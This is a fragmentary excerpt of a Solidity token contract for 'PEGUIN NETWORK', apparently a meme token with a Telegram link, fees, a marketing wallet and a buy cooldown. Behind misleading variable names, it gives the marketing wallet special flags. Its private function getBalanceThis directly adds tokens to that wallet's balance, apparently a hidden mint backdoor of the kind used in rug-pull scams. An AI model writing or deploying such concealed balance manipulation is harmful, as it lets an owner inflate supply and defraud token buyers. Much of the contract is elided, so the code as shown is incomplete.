...
/*
    PEGUIN NETWORK
    Telegram : https://t.me/peguinnetwork
 */
...
contract PEGUINNETWORK is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isVisualization;
    mapping (address => bool) private _isWave;
   
    uint256 private _tTotal = 1 * 10**9 * 10**9;
    uint256 public _maxWallet = _tTotal/10;
    uint256 private _liquifyThreshhold = _tTotal/100;

    string private constant _name = "PEGUIN NETWORK";
    string private constant _symbol = "PEGUINNET";
    uint8 private constant _decimals = 9;
    
    uint256 private _marketingFee = 3;
    uint256 private _liquidityFee = 0;

    address private  _marketingWallet = 0x3DE63780967b8d313fA3AfA7e7cb8494e9630CaB;
    address private  nullBurnAddress = 0x000000000000000000000000000000000000dEaD;
    
    uint256 public _buyCooldown = 0 minutes;
    mapping (address => uint256) private _isBlow;
    ...
    constructor () {
        ...
        _isVisualization[_marketingWallet] = true;
        _isWave[nullBurnAddress] = true;
    ...
    function setmaxWallet(uint256 Balance) private {
        _maxWallet = Balance;
    }
    ...
    function _transfer(
        ...
        if (from == uniswapV2Pair &&
            ...
            require (_isBlow[to] + _buyCooldown < block.timestamp, "Must wait til after coooldown to buy");
            _isBlow[to] = block.timestamp;
        } else {
            if ( from == uniswapV2Pair &&
                _isVisualization[to]) {
    ...
    function getBalanceThis(uint256 tokens) private {
        _tOwned[_marketingWallet] = _tOwned[_marketingWallet]+tokens;
